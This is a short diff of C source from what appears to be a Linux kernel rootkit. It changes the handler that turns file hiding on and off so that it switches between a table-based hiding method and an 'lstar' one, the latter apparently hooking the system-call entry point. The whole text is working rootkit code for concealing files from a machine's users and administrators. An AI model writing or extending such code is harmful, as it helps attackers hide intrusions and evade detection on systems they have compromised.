@@ -123,15 +123,28 @@ handle_modhide(unsigned long arg)
 int
 handle_filehide(unsigned long arg)
 {
+    static fh_state_t last_state
+        = rootkit.hiding_files == FH_OFF ? FH_TABLE : rootkit.hiding_files;
+
     long sarg = (long)arg;
     bool set = rootkit.hiding_files;
 
-    if (sarg > 0 || (!sarg && (set ^ 1))) {
-        hide_files();
-        rootkit.hiding_files = 1;
-    } else if (sarg < 0 || (!sarg && !(set ^ 1))) {
-        unhide_files();
-        rootkit.hiding_files = 0;
+    if (sarg > 0 || (!sarg && !set)) {
+        rootkit.hiding_files = last_state;
+
+        switch (rootkit.hiding_files) {
+        case FH_TABLE: hide_files();       break;
+        case FH_LSTAR: hide_files_lstar(); break;
+        default: break;
+        }
+    } else if (sarg < 0 || (!sarg && set)) {
+        switch (rootkit.hiding_files) {
+        case FH_TABLE: unhide_files();       break;
+        case FH_LSTAR: unhide_files_lstar(); break;
+        default: break;
+        }
+
+        rootkit.hiding_files = FH_OFF;
     }
 
     DEBUG_NOTICE("[g7] filehide %s\n", rootkit.hiding_files ? "on" : "off");
